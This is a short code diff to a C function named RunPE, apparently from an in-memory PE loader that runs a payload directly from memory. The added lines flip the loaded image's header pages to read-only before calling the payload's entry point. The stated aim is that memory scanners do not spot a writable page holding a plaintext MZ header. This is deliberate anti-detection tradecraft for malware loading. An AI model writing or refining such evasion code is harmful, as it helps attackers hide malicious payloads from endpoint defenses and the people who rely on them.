@@ -658,6 +658,16 @@ DWORD RunPE(BYTE* pPeFile, DWORD peFileSize, DWORD exportHash, DWORD exportSeed,
             }
         }
     } else {
+        /* EXE header pages stay mapped for the payload's lifetime (MSVC CRT
+         * startup re-reads them via PEB->ImageBaseAddress), but nothing
+         * legitimately writes to them. Drop the W bit before EP so a memory
+         * scanner sees an RO page instead of an RW page holding a plaintext
+         * MZ header. Soft-fail: a failed protect must not abort execution. */
+        PVOID  pHdrBase = (PVOID)pBase;
+        SIZE_T hdrSize  = (SIZE_T)pNt->OptionalHeader.SizeOfHeaders;
+        DWORD  dwHdrOld = 0;
+        pNtProtectVirtualMemory((HANDLE)-1, &pHdrBase, &hdrSize, PAGE_READONLY, &dwHdrOld);
+
         void (*pMain)(void) = (void (*)(void))(pBase + pNt->OptionalHeader.AddressOfEntryPoint);
         pMain();
     }
